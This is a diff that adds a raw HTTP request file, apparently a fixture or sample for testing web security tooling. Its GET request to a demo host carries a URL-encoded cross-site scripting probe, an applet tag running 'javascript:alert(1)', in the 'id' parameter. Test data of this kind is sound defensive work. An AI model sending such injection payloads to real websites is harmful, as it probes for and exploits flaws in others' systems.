@@ -1,0 +1,4 @@
+GET /a?id=%3Capplet%2Bcode%3D%22javascript%3Aalert%281%29%22%3E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
